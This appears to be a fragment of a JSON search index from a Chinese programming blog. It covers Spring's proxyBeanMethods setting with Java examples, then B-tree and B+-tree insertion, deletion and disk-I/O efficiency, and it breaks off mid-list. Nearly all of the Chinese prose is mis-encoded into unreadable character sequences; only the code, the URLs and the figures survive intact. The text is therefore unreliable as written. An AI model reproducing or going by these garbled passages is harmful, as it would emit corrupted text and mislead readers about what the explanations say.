å¼ºå¤§çš„åŠŸèƒ½ï¼Œå®ƒå¯ä»¥ä¿éšœé…ç½®ç±»ä¸­ä½¿ç”¨æ–¹æ³•åˆ›å»ºçš„beançš„å”¯ä¸€æ€§ã€‚ä¸º@Configurationæ³¨è§£è®¾ç½®proxyBeanMethodså±æ€§å€¼ä¸ºtrueå³å¯ï¼Œç”±äºæ­¤å±æ€§é»˜è®¤å€¼ä¸ºtrueï¼Œæ‰€ä»¥å¾ˆå°‘çœ‹è§æ˜ç¡®ä¹¦å†™çš„ï¼Œé™¤éæƒ³æ”¾å¼ƒæ­¤åŠŸèƒ½ã€‚\n\n```java\n@Configuration(proxyBeanMethods = true)\npublic class SpringConfig {\n    @Bean\n    public Cat cat(){\n        return new Cat();\n    }\n}\n```\n\nä¸‹é¢é€šè¿‡å®¹å™¨å†è°ƒç”¨ä¸Šé¢çš„catæ–¹æ³•æ—¶ï¼Œå¾—åˆ°çš„å°±æ˜¯åŒä¸€ä¸ªå¯¹è±¡äº†ã€‚æ³¨æ„ï¼Œå¿…é¡»ä½¿ç”¨springå®¹å™¨å¯¹è±¡è°ƒç”¨æ­¤æ–¹æ³•æ‰æœ‰ä¿æŒbeanå”¯ä¸€æ€§çš„ç‰¹æ€§ã€‚æ­¤ç‰¹æ€§åœ¨å¾ˆå¤šåº•å±‚æºç ä¸­æœ‰åº”ç”¨ã€‚\n\n```java\npublic class App {\n    public static void main(String[] args) {\n        ApplicationContext ctx = new AnnotationConfigApplicationContext(SpringConfig.class);\n        String[] names = ctx.getBeanDefinitionNames();\n        for (String name : names) {\n            System.out.println(name);\n        }\n        System.out.println(\"-------------------------\");\n        SpringConfig springConfig = ctx.getBean(\"springConfig\", SpringConfig.class);\n        System.out.println(springConfig.cat());\n        System.out.println(springConfig.cat());\n        System.out.println(springConfig.cat());\n    }\n}\n```\n\n## å‚è€ƒ\n\n- [SpringçŸ¥è¯†ç‚¹ç²¾ç®€ç‰ˆæ¢³ç†ï¼ˆä¸€ï¼‰â€”â€”æ¦‚è¿°](https://blog.csdn.net/qq_35843514/article/details/114287046?spm=1001.2014.3001.5501)\n\n- [Spring-å…¨é¢è¯¦è§£ï¼ˆå­¦ä¹ æ€»ç»“ï¼‰](https://blog.csdn.net/weixin_44207403/article/details/106736102?ops_request_misc=%7B%22request%5Fid%22%3A%22161443766616780357241220%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=161443766616780357241220&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-106736102.first_rank_v2_pc_rank_v29&utm_term=Spring)\n\n- [Spring Framework ä¸­æ–‡æ–‡æ¡£](https://www.docs4dev.com/docs/zh/spring-framework/5.1.3.RELEASE/reference/)\n\n- [Spring æ¡†æ¶æ¦‚è¿° | ä¸­æ–‡æ–‡æ¡£ (gitcode.net)](https://docs.gitcode.net/spring/guide/spring-framework/overview.html)\n- [Spring-IOCå®¹å™¨](https://blog.csdn.net/xiaoyixiao_/article/details/116835572)\n- [spring IOCå®¹å™¨ç®¡ç†å¿…é¡»çŸ¥é“è¿™äº›æ“ä½œ](https://blog.csdn.net/weixin_45496190/article/details/107059038?spm=1001.2014.3001.5502)\n\n## â¤ï¸Sponsor\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ°å·§è´¢åŠ›é›„åšï¼Œåˆæ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["Spring"],"categories":["Spring"]},{"title":"æ•°æ®ç»“æ„ï¼šB-Treeå®¶æ—","url":"/posts/30130.html","content":"\n## B-tree\n\n```\n\n```\n\n**è®ºæ–‡åç§°ï¼šã€ŠOrganization and maintenance of large ordered indices Share onã€‹**\n\n- ä½œè€…ï¼šR. Bayerï¼ŒE. McCreight\n- å•ä½ï¼šMathematical and Information Sciences Laboratory\n- ä¼šè®®ï¼š[SIGMOD](https://dl.acm.org/doi/10.1145/1734663.1734671)ã€CCF Aã€‘\n- æ—¶é—´ï¼š1970å¹´11æœˆ\n\n### ä¸ºä»€ä¹ˆ B-tree ä¼šè¯ç”Ÿå‘¢ï¼Ÿ\n\n- ä¸ºäº†å‡å°‘ç£ç›˜ I/O æ“ä½œ\n  - æˆ‘ä»¬å‡è®¾æ•°æ®é‡è¾¾åˆ°äº†äº¿çº§åˆ«ï¼Œå†…å­˜æ ¹æœ¬å­˜å‚¨ä¸ä¸‹ï¼Œæˆ‘ä»¬åªèƒ½ä»¥å—çš„å½¢å¼ä»ç£ç›˜è¯»å–æ•°æ®ï¼Œä¸å†…å­˜çš„è®¿é—®æ—¶é—´ç›¸æ¯”ï¼Œç£ç›˜ I/O æ“ä½œç›¸å½“è€—æ—¶(æ…¢ä¸Šç™¾å€åƒå€ç”šè‡³ä¸‡å€)ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬åº”å½“å°½é‡å‡å°‘ä»ç£ç›˜ä¸­è¯»å–æ•°æ®çš„æ¬¡æ•°ã€‚\n\n- ä¸ºäº†ä¸€æ¬¡ç£ç›˜ I/O æ“ä½œè¯»å–æ›´å¤šæ•°æ®\n  - ä»ç£ç›˜ä¸­è¯»å–æ•°æ®æ—¶ï¼Œéƒ½æ˜¯æŒ‰ç…§ç£ç›˜å—æ¥è¯»å–çš„ï¼Œå¹¶ä¸æ˜¯ä¸€æ¡ä¸€æ¡çš„è¯»ã€‚å¦‚æœæˆ‘ä»¬èƒ½æŠŠå°½é‡å¤šçš„æ•°æ®æ”¾è¿›ç£ç›˜å—ä¸­ï¼Œé‚£ä¸€æ¬¡ç£ç›˜è¯»å–æ“ä½œå°±ä¼šè¯»å–æ›´å¤šæ•°æ®ï¼Œé‚£æˆ‘ä»¬æŸ¥æ‰¾æ•°æ®çš„æ—¶é—´ä¹Ÿä¼šå¤§å¹…åº¦é™ä½ã€‚\n\næˆ‘ä»¬éƒ½çŸ¥é“å¹³è¡¡äºŒå‰æ ‘ä¸­ä¸€ä¸ªç»“ç‚¹åªèƒ½æœ€å¤š 2 ä¸ªå­ç»“ç‚¹ï¼Œæ¯ä¸ªèŠ‚ç‚¹åªå­˜å‚¨ä¸€ä¸ªæ•°æ®ã€‚é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•æ”¹è¿›å‘¢ï¼Ÿ\n\nä¸€ä¸ªè‡ªç„¶è€Œç„¶çš„æƒ³æ³•ï¼**è®©æ¯ä¸ªç»“ç‚¹å¯ä»¥æœ‰æ›´å¤šçš„æ•°æ®é¡¹å’Œæ›´å¤šçš„å­ç»“ç‚¹**\n\nå¥½çš„ï¼Œä½ å·²ç»å‘æ˜äº† B-Tree ï¼ï¼ï¼\n\nä¸‹é¢å°±æ¥å…·ä½“ä»‹ç»ä¸€ä¸‹ B-Tree\n\n### ç®€ä»‹\n\nB-tree æ˜¯ä¸€ç§å¤šè·¯å¹³è¡¡æŸ¥æ‰¾æ ‘ï¼Œæå‡º B-tree çš„ä¸»è¦ç›®çš„å°±æ˜¯å‡å°‘ç£ç›˜çš„ I/O æ“ä½œã€‚\n\n**ä¸€ä¸ª m é˜¶çš„ B-tree å…·æœ‰å¦‚ä¸‹å‡ ä¸ªç‰¹å¾ï¼š**\n\n- 1ã€æ ¹ç»“ç‚¹è‡³å°‘æœ‰ 2 ä¸ªå­ç»“ç‚¹\n- 2ã€æ¯ä¸ªéæ ¹çš„åˆ†æ”¯ç»“ç‚¹éƒ½æœ‰ k-1 ä¸ªå…ƒç´ å’Œ k ä¸ªå­©å­ï¼Œå…¶ä¸­ â¡m/2â¤â‰¤ k â‰¤ m\n- 3ã€æ¯ä¸€ä¸ªå¶å­ç»“ç‚¹éƒ½æœ‰ k-1 ä¸ªå…ƒç´ ï¼Œå…¶ä¸­ â¡m/2â¤â‰¤ k â‰¤ m\n- 4ã€æ‰€æœ‰çš„å¶å­ç»“ç‚¹éƒ½ä½äºåŒä¸€å±‚ã€‚\n- 5ã€æ¯ä¸ªèŠ‚ç‚¹ä¸­çš„å…ƒç´ ä»å°åˆ°å¤§æ’åˆ—ï¼ŒèŠ‚ç‚¹å½“ä¸­ k-1 ä¸ªå…ƒç´ æ­£å¥½æ˜¯ k ä¸ªå­©å­åŒ…å«çš„å…ƒç´ çš„å€¼åŸŸåˆ†åˆ’ã€‚\n\næœ¯è¯­ï¼š3 é˜¶ B-tree ç§°ä¸º 2-3 æ ‘ã€4 é˜¶ B-tree ç§°ä¸º 2-3-4 æ ‘\n\nå¦‚ä¸‹å›¾æ˜¯ä¸€é¢—æ ‡å‡†çš„ 3 é˜¶ B-tree ï¼š\n\n![](https://img.jwt1399.top/img/image-20220414161200077.png)\n\n- m = 3ã€2 â‰¤ k â‰¤ 3\n- è¯¥æ ‘æ»¡è¶³ä¸Šè¿°æ‰€æœ‰ç‰¹å¾\n\né‚£ä¹ˆå¦‚å›¾çš„æ ‘æ˜¯æ€ä¹ˆæ„é€ çš„å‘¢ï¼Ÿä¸‹é¢ä¸ºæˆ‘ä»¬æ¥ä¸€æ­¥ä¸€æ­¥æ¥æ„é€ å“ˆ\n\n### æ’å…¥\n\n#### è§„åˆ™\n\né¦–å…ˆåˆ¤æ–­æ˜¯å¦æ˜¯ç©ºæ ‘\n\n- è‹¥æ˜¯ç©ºæ ‘ï¼Œåˆ™åˆ›å»ºç»“ç‚¹ï¼Œæ’å…¥key\n\n- è‹¥ä¸æ˜¯ç©ºæ ‘\n\n  - 1ã€æ ¹æ®å·¦å¤§å³å°è§„åˆ™æ‰¾åˆ°å¾…æ’å…¥ç»“ç‚¹ä½ç½®\n\n  - 2ã€åˆ¤æ–­å½“å‰ç»“ç‚¹ key çš„ä¸ªæ•°æ˜¯å¦å°äº k-1ï¼Œè‹¥æ»¡è¶³ï¼Œåˆ™ç›´æ¥æ’å…¥\n\n  - 3ã€è‹¥ä¸æ»¡è¶³ï¼Œä»¥ç»“ç‚¹ä¸­é—´çš„ key ä¸ºä¸­å¿ƒåˆ†è£‚æˆå·¦å³ä¸¤éƒ¨åˆ†ï¼Œä¸­é—´å…³é”®å­—å…ƒç´ ä¸Šç§»åˆ°çˆ¶ç»“ç‚¹ä¸­ï¼ˆå¦‚æœçˆ¶ç»“ç‚¹ç©ºé—´æ»¡äº†ï¼Œä¹ŸåŒæ ·éœ€è¦â€œåˆ†è£‚â€æ“ä½œï¼‰ï¼Œè¿™ä¸ª key çš„å·¦å­æ ‘æŒ‡å‘åˆ†è£‚åçš„å·¦åŠéƒ¨åˆ†ï¼Œè¿™ä¸ª key çš„å³å­æ”¯æŒ‡å‘åˆ†è£‚åçš„å³åŠéƒ¨åˆ†ï¼Œç„¶åå°†å½“å‰ç»“ç‚¹æŒ‡å‘çˆ¶ç»“ç‚¹ã€‚\n\n#### ç¤ºä¾‹\n\nğŸŒ°ï¼šæ„é€ ä¸€ä¸ª 3 é˜¶ B-tree ï¼Œå­˜å‚¨æ•°æ®{1,2,3,4,5,6,7,8,9,10}\n\n- m = 3ã€2 â‰¤ k â‰¤ 3ã€1 â‰¤ k-1 â‰¤ 2\n\n| æ’å…¥1ï¼Œ2                                                     | æ’å…¥3                                                        | æ’å…¥4                                                        |\n| ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| ![](https://img.jwt1399.top/img/image-20220414143100841.png) | ![](https://img.jwt1399.top/img/image-20220414143124434.png) | ![](https://img.jwt1399.top/img/image-20220414145559175.png) |\n| **æ’å…¥5**                                                    | **æ’å…¥6**                                                    | **æ’å…¥7**                                                    |\n| ![](https://img.jwt1399.top/img/image-20220414145647323.png) | ![](https://img.jwt1399.top/img/image-20220414150119829.png) | ![](https://img.jwt1399.top/img/image-20220414150314053.png) |\n| **æ’å…¥8**                                                    | **æ’å…¥9**                                                    | **æ’å…¥10**                                                   |\n| ![](https://img.jwt1399.top/img/image-20220414150910287.png) | ![](https://img.jwt1399.top/img/image-20220414151121225-20220415173523197.png) | ![](https://img.jwt1399.top/img/image-20220414161200077.png) |\n\n- æ’å…¥1æ—¶ï¼Œä¸ºç©ºæ ‘ï¼Œå»ºç«‹ç»“ç‚¹ç›´æ¥æ’å…¥\n- æ’å…¥2æ—¶ï¼Œæ»¡è¶³ç»“ç‚¹çš„keyä¸ªæ•° â‰¤ k-1ï¼Œç›´æ¥æ’å…¥å½“å‰ç»“ç‚¹\n- æ’å…¥3æ—¶ï¼Œä¸æ»¡è¶³ç»“ç‚¹çš„keyä¸ªæ•° â‰¤ k-1ï¼Œè¿›è¡Œåˆ†è£‚æ“ä½œ\n  - å°†2å‡è‡³çˆ¶ç»“ç‚¹ï¼Œ1ä¸ºå·¦ç»“ç‚¹ï¼Œ3ä¸ºå³ç»“ç‚¹\n- æ’å…¥4æ—¶ï¼Œæ»¡è¶³ç»“ç‚¹çš„keyä¸ªæ•° â‰¤ k-1ï¼Œç›´æ¥æ’å…¥å½“å‰ç»“ç‚¹\n- æ’å…¥5æ—¶ï¼Œä¸æ»¡è¶³ç»“ç‚¹çš„keyä¸ªæ•° â‰¤ k-1ï¼Œè¿›è¡Œåˆ†è£‚æ“ä½œ\n  - å°†4å‡è‡³çˆ¶ç»“ç‚¹ï¼Œ3ä¸ºå·¦ç»“ç‚¹ï¼Œ5ä¸ºå³ç»“ç‚¹\n- æ’å…¥6æ—¶ï¼Œæ»¡è¶³ç»“ç‚¹çš„keyä¸ªæ•° â‰¤ k-1ï¼Œç›´æ¥æ’å…¥å½“å‰ç»“ç‚¹\n- æ’å…¥7æ—¶ï¼Œä¸æ»¡è¶³ç»“ç‚¹çš„keyä¸ªæ•° â‰¤ k-1ï¼Œè¿›è¡Œåˆ†è£‚æ“ä½œ\n  - å°†6å‡è‡³çˆ¶ç»“ç‚¹ï¼Œ5ä¸ºå·¦ç»“ç‚¹ï¼Œ7ä¸ºå³ç»“ç‚¹\n  - 6å‡è‡³çˆ¶ç»“ç‚¹åï¼Œçˆ¶ç»“ç‚¹keyä¸ªæ•°å·²ç»è¶…è¿‡ k-1\n  - æ‰§è¡Œåˆ†è£‚æ“ä½œï¼Œå†å°†4å‡å…¥çˆ¶èŠ‚ç‚¹ï¼Œ2ä¸ºå·¦ç»“ç‚¹ï¼Œ6ä¸ºå³ç»“ç‚¹\n- æ’å…¥8æ—¶ï¼Œæ»¡è¶³ç»“ç‚¹çš„keyä¸ªæ•° â‰¤ k-1ï¼Œç›´æ¥æ’å…¥å½“å‰ç»“ç‚¹\n- æ’å…¥9æ—¶ï¼Œä¸æ»¡è¶³ç»“ç‚¹çš„keyä¸ªæ•° â‰¤ k-1ï¼Œè¿›è¡Œåˆ†è£‚æ“ä½œ\n  - å°†8å‡è‡³çˆ¶ç»“ç‚¹ï¼Œ7ä¸ºå·¦ç»“ç‚¹ï¼Œ9ä¸ºå³ç»“ç‚¹\n- æ’å…¥10æ—¶ï¼Œæ»¡è¶³ç»“ç‚¹çš„keyä¸ªæ•° â‰¤ k-1ï¼Œç›´æ¥æ’å…¥å½“å‰ç»“ç‚¹\n\n**æ’å…¥åŠ¨æ€æ¼”ç¤ºï¼š**[B-Tree åŠ¨æ€æ¼”ç¤º](https://www.cs.usfca.edu/~galles/visualization/BTree.html)\n\n### åˆ é™¤\n\nB-tree çš„åˆ é™¤æ¯”æ’å…¥æ›´å¤æ‚ä¸€äº›ï¼Œå› ä¸ºåˆ é™¤ä¹‹åè¿˜æ¶‰åŠåˆ°ç§»åŠ¨å…ƒç´ çš„æ“ä½œã€‚\n\n#### è§„åˆ™\n\næ ¹æ®å·¦å¤§å³å°è§„åˆ™æ‰¾åˆ°å¾…åˆ é™¤ç»“ç‚¹ä½ç½®\n\n- æƒ…å†µ1ï¼šä½äºå¶å­ç»“ç‚¹ä¸Šï¼Œç›´æ¥åˆ é™¤\n  - (1.1)å¦‚æœåˆ é™¤åï¼Œç»“ç‚¹keyä¸ªæ•°è¿˜æ˜¯æ»¡è¶³ k-1 èŒƒå›´ ï¼Œé‚£ä¹ˆç»“æŸåˆ é™¤æ“ä½œ\n  - (1.2)åä¹‹ï¼Œçˆ¶èŠ‚ç‚¹ä¸­çš„keyä¸‹ç§»...\n- æƒ…å†µ2ï¼šä½äºåˆ†æ”¯ç»“ç‚¹ä¸Šï¼Œé¦–å…ˆæ‰¾åˆ°åˆ é™¤èŠ‚ç‚¹çš„åç»§èŠ‚ç‚¹ï¼Œç”¨åç»§èŠ‚ç‚¹è¦†ç›–è¦åˆ é™¤çš„èŠ‚ç‚¹ï¼Œå†åˆ é™¤åç»§èŠ‚ç‚¹\n  - (2.1)å¦‚æœåˆ é™¤åè¯¥èŠ‚ç‚¹ä¸­å…³é”®å­—çš„ä¸ªæ•°å¤§äºç­‰äº k-1ï¼Œé‚£ä¹ˆç»“æŸåˆ é™¤æ“ä½œ\n  - (2.2)å¦‚æœå…„å¼ŸèŠ‚ç‚¹keyä¸ªæ•°æ»¡è¶³ k-1ï¼Œå°†çˆ¶èŠ‚ç‚¹ä¸­çš„keyä¸‹ç§»åˆ°è¯¥èŠ‚ç‚¹ï¼Œå…„å¼ŸèŠ‚ç‚¹ä¸­çš„ä¸€ä¸ªkeyä¸Šç§»ï¼Œåˆ é™¤æ“ä½œç»“æŸ\n  - (2.3)å¦‚æœå…„å¼ŸèŠ‚ç‚¹keyä¸ªæ•°å°äº k-1ï¼Œå°†çˆ¶èŠ‚ç‚¹ä¸­çš„keyä¸‹ç§»åˆ°è¯¥èŠ‚ç‚¹ï¼Œå¹¶ä¸å®ƒçš„å…„å¼ŸèŠ‚ç‚¹ä¸­çš„keyåˆå¹¶ï¼Œå½¢æˆä¸€ä¸ªæ–°çš„èŠ‚ç‚¹ï¼Œç„¶åä¿®æ”¹æŒ‡å‘å³å¯ã€‚\n\n#### ç¤ºä¾‹\n\n| åŸå§‹B-Tree                                                   | åˆ é™¤10                                                       | å†åˆ é™¤9                                                      |\n| ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| ![](https://img.jwt1399.top/img/image-20220414161200077.png) | ![](https://img.jwt1399.top/img/image-20220414151121225.png) | ![](https://img.jwt1399.top/img/image-20220414162723953.png) |\n| **å†åˆ é™¤2**                                                  | **åŸå›¾-åˆ é™¤2**                                               | **åŸå›¾-åˆ é™¤8**                                               |\n| ![](https://img.jwt1399.top/img/image-20220414170411469.png) | ![](https://img.jwt1399.top/img/image-20220414164202330.png) | ![](https://img.jwt1399.top/img/image-20220414165708210.png) |\n\n- åˆ é™¤ 10 æ—¶ï¼Œæ»¡è¶³æƒ…å†µ 1.1\n- å†åˆ é™¤ 9 æ—¶ï¼Œæ»¡è¶³æƒ…å†µ 1.2\n- å†åˆ é™¤ 2 æ—¶ï¼Œæ»¡è¶³æƒ…å†µ 2.3\n\n- åˆ é™¤ 8 æ—¶ï¼Œæ»¡è¶³æƒ…å†µ 2.1\n- åˆ é™¤ 2 æ—¶ï¼Œæ»¡è¶³æƒ…å†µ 2.2\n\n\n\n### æ•ˆç‡\n\nå‡è®¾æˆ‘ä»¬ç°åœ¨æœ‰ 838,8608 æ¡è®°å½•\n\n- å¯¹äº AVL æ ‘è€Œè¨€ï¼Œæ ‘çš„é«˜åº¦ h = log<sub>2</sub>(838,8608) â‰ˆ 23ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœè¦æŸ¥æ‰¾åˆ°å¶å­ç»“ç‚¹éœ€è¦ 23 æ¬¡ç£ç›˜ I/O æ“ä½œ\n\n- å¯¹äº B-Treeï¼Œå‡è®¾æ¯ä¸ªç»“ç‚¹ 8 ä¸ªå…ƒç´ ï¼ˆå½“ç„¶çœŸå®æƒ…å†µä¸‹æ²¡æœ‰è¿™ä¹ˆå¹³å‡ï¼Œæœ‰çš„ç»“ç‚¹æ¯”8å¤šä¸€äº›ï¼Œæœ‰äº›æ¯” 8 å°‘ä¸€äº›ï¼‰ï¼Œæ ‘çš„é«˜åº¦ h = log<sub>8</sub>(838,8608) â‰ˆ 8  ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœè¦æŸ¥æ‰¾åˆ°å¶å­ç»“ç‚¹éœ€è¦ 8 æ¬¡ç£ç›˜ I/O æ“ä½œ\n\n##  B<sup>+</sup>-tree\n\n### ä¸ºä»€ä¹ˆ B<sup>+</sup>-tree ä¼šè¯ç”Ÿå‘¢ï¼Ÿ\n\nB-tree ä»ç„¶æœ‰ä¸€ä¸ªè‡´å‘½çš„ç¼ºé™·ï¼Œé‚£å°±æ˜¯å®ƒçš„ç´¢å¼•ä¸æ•°æ®ç»‘å®šåœ¨ä¸€å—ï¼Œè€Œæ•°æ®çš„å¤§å°å¾ˆæœ‰å¯èƒ½è¿œè¿œè¶…è¿‡äº†ç´¢å¼•æ•°æ®ï¼ŒæŸ¥æ‰¾ä¸­é€”è¿‡ç¨‹ä¼šåŠ è½½å¾ˆå¤šæ— ç”¨çš„æ•°æ®ï¼Œè¿™ä¼šå¤§å¤§å‡å°ä¸€æ¬¡ I/O æœ‰ç”¨æ•°æ®çš„è·å–ï¼Œé—´æ¥çš„å¢åŠ  I/O æ¬¡æ•°å»è·å–æœ‰ç”¨çš„ç´¢å¼•æ•°æ®ã€‚\n\nå› æ­¤ï¼Œå¦‚æœåªæŠŠæ•°æ®å­˜å‚¨åœ¨æœ€ç»ˆæŸ¥è¯¢åˆ°çš„é‚£ä¸ªèŠ‚ç‚¹æ˜¯ä¸æ˜¯å°±å¯ä»¥äº†ï¼Ÿä½†æ˜¯è°çŸ¥é“å“ªä¸ªèŠ‚ç‚¹å°±æ˜¯æœ€ç»ˆè¦æŸ¥è¯¢çš„èŠ‚ç‚¹å‘¢ï¼Ÿ\n\n B<sup>+</sup>-tree æ¨ªç©ºå‡ºä¸–ï¼ŒB<sup>+</sup>-tree æ ‘å°±æ˜¯ä¸ºäº†æ‹†åˆ†ç´¢å¼•ä¸æ•°æ®çš„å¤šè·¯å¹³è¡¡æŸ¥æ‰¾æ ‘ã€‚\n\n### ç®€ä»‹\n\nB<sup>+</sup>-tree æ˜¯ B-tree çš„å˜ä½“\n\n**ä¸€ä¸ª m é˜¶ B<sup>+</sup>-tree æ ‘å…·æœ‰å¦‚ä¸‹å‡ ä¸ªç‰¹å¾ï¼š**\n\n- 1ã€æ ¹ç»“ç‚¹è‡³å°‘æœ‰ 2 ä¸ªå­ç»“ç‚¹\n\n- 2ã€æ¯ä¸ªéæ ¹çš„åˆ†æ”¯ç»“ç‚¹éƒ½æœ‰ k-1 ä¸ªå…ƒç´ å’Œ k ä¸ªå­©å­ï¼Œå…¶ä¸­ â¡m/2â¤â‰¤ k â‰¤ m\n  -  æ­¤å¤„é¢‡æœ‰äº‰è®®ï¼Œåˆ°åº•æ˜¯ä¸B-tree k-1 ä¸ªå…ƒç´ å’Œ k ä¸ªå­©å­ï¼Œè¿˜æ˜¯ä¸ä¸€è‡´ï¼šk ä¸ªå…ƒç´ å’Œ k ä¸ªå­©å­ï¼Œå¾…æŸ¥è¯\n- 3ã€B<sup>+</sup>-tree éå¶å­èŠ‚ç‚¹ä¸Šæ˜¯ä¸å­˜å‚¨æ•°æ®çš„ï¼Œä»…å­˜å‚¨é”®å€¼ç”¨æ¥ç´¢å¼•ï¼Œæ‰€æœ‰æ•°æ®éƒ½ä¿å­˜åœ¨å¶å­èŠ‚ç‚¹ä¸”å¶å­ç»“ç‚¹æœ¬èº«ä¾å…³é”®å­—çš„å¤§å°è‡ªå°è€Œå¤§é¡ºåºé“¾æ¥ã€‚\n\nå¦‚ä¸‹å›¾æ˜¯ä¸€é¢—æ ‡å‡†çš„ 3 é˜¶ B<sup>+</sup>-tree ï¼š\n\n![](https://img.jwt1399.top/img/image-20220414230923235.png)\n\nå¤´å¶ç»“ç‚¹ä¹‹å‰å…¶å®è¿˜æœ‰ä¸€ä¸ªå¤´æŒ‡é’ˆï¼Œä¸Šå›¾æ²¡æœ‰ç”»å‡º\n\n### æ’å…¥\n\næ’å…¥è§„åˆ™ä¸ B-tree ç±»ä¼¼\n\n#### ç¤ºä¾‹\n\nğŸŒ°ï¼šæ„é€ ä¸€ä¸ª 3 é˜¶ B-tree ï¼Œå­˜å‚¨æ•°æ®{1,2,3,4,5,6,7,8,9,10}\n\n- m = 3ã€2 â‰¤ k â‰¤ 3\n\n| æ’å…¥1ã€2                                                     | æ’å…¥3                                                        | æ’å…¥4                                                        |\n| ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| ![](https://img.jwt1399.top/img/image-20220414143100841.png) | ![](https://img.jwt1399.top/img/image-20220414225825667.png) | ![](https://img.jwt1399.top/img/image-20220414225927090.png) |\n| **æ’å…¥5**                                                    | **æ’å…¥6**                                                    | **æ’å…¥7**                                                    |\n| ![](https://img.jwt1399.top/img/image-20220414230530478.png) | ![](https://img.jwt1399.top/img/image-20220414230611439.png) | ![](https://img.jwt1399.top/img/image-20220414230754985.png) |\n| **æ’å…¥8**                                                    | **æ’å…¥9**                                                    | **æ’å…¥10**                                                   |\n| ![](https://img.jwt1399.top/img/image-20220414230839477.png) | ![](https://img.jwt1399.top/img/image-20220414230857886.png) | ![](https://img.jwt1399.top/img/image-20220414230923235-20220415173651956.png) |\n\n###  åˆ é™¤\n\nä¸ B-tree ç±»ä¼¼\n\n### æŸ¥æ‰¾\n\nB<sup>+</sup>-tree çš„æŸ¥æ‰¾ä¸Bæ ‘ä¸åŒï¼Œå½“ç´¢å¼•éƒ¨åˆ†æŸä¸ªç»“ç‚¹çš„å…³é”®å­—ä¸æ‰€æŸ¥çš„å…³é”®å­—ç›¸ç­‰æ—¶ï¼Œå¹¶ä¸åœæ­¢æŸ¥æ‰¾ï¼Œåº”ç»§ç»­æ²¿ç€è¿™ä¸ªå…³é”®å­—å·¦è¾¹çš„æŒ‡é’ˆå‘ä¸‹ï¼Œä¸€ç›´æŸ¥åˆ°è¯¥å…³é”®å­—æ‰€åœ¨çš„å¶å­ç»“ç‚¹ä¸ºæ­¢ã€‚\n\n### æ•ˆç‡\n\nç”Ÿäº§ç¯å¢ƒä¸­B<sup>+</sup>-treeçš„é«˜åº¦ä¸€èˆ¬å°± 3ï½4 å±‚\n\nä¸€æ£µ B+ æ ‘çš„å­˜æ”¾æ€»è®°å½•æ•°ä¸ºï¼šç´¢å¼•ç»“ç‚¹æŒ‡é’ˆæ•° \\* å•ä¸ªå¶å­èŠ‚ç‚¹è®°å½•è¡Œæ•°ã€‚\n\næˆ‘ä»¬å‡è®¾ä¸»é”® ID ä¸º bigint ç±»å‹ï¼Œé•¿åº¦ä¸º 8 å­—èŠ‚ï¼Œè€ŒæŒ‡é’ˆå¤§å°åœ¨è®¾ç½®ä¸º 6 å­—èŠ‚ï¼Œè¿™æ ·ä¸€å…± 14 å­—èŠ‚ï¼Œæˆ‘ä»¬ä¸€ä¸ªç»“ç‚¹ä¸­èƒ½å­˜æ”¾å¤šå°‘è¿™æ ·çš„å•å…ƒï¼Œå…¶å®å°±ä»£è¡¨æœ‰å¤šå°‘æŒ‡é’ˆï¼Œå³ 16384/14=1170\n\nInnoDB ä¸­é¡µçš„é»˜è®¤å¤§å°æ˜¯ 16KBï¼Œå‡è®¾ä¸€è¡Œè®°å½•çš„æ•°æ®å¤§å°ä¸º 1kï¼Œåˆ™ä¸€ä¸ªå¶å­ç»“ç‚¹ï¼ˆé¡µï¼‰ä¸­çš„è®°å½•æ•° = 16K/1K = 16\n\nä¸€ä¸ªé«˜åº¦ä¸º 3 çš„ B+ æ ‘å¯ä»¥å­˜æ”¾ï¼š 1170\\*1170\\*16 = 21902400 æ¡è¿™æ ·çš„è®°å½•ã€‚\n\nä¸€èˆ¬æ ¹èŠ‚ç‚¹æ˜¯å¸¸é©»å†…å­˜çš„ï¼Œæ‰€ä»¥ä¸€èˆ¬æˆ‘ä»¬æŸ¥æ‰¾ 2åƒå¤šä¸‡çš„æ•°æ®ï¼Œåªéœ€è¦ 2 æ¬¡ç£ç›˜ IOã€‚\n\n### B<sup>+</sup>-treeå’ŒB-treeçš„åŒºåˆ«\n\n- B-tree å†…éƒ¨èŠ‚ç‚¹æ˜¯ä¿å­˜æ•°æ®çš„ï¼›B<sup>+</sup>-treeå†…éƒ¨èŠ‚ç‚¹æ˜¯ä¸ä¿å­˜æ•°æ®çš„ï¼Œåªä½œç´¢å¼•ä½œç”¨ï¼Œå®ƒçš„å¶å­èŠ‚ç‚¹æ‰ä¿å­˜æ•°æ®ã€‚\n- B<sup>+</sup>-tree ç›¸é‚»çš„å¶å­èŠ‚ç‚¹ä¹‹é—´æ˜¯é€šè¿‡é“¾è¡¨æŒ‡é’ˆè¿èµ·æ¥çš„ï¼ŒB-treeå´ä¸æ˜¯ã€‚\n- 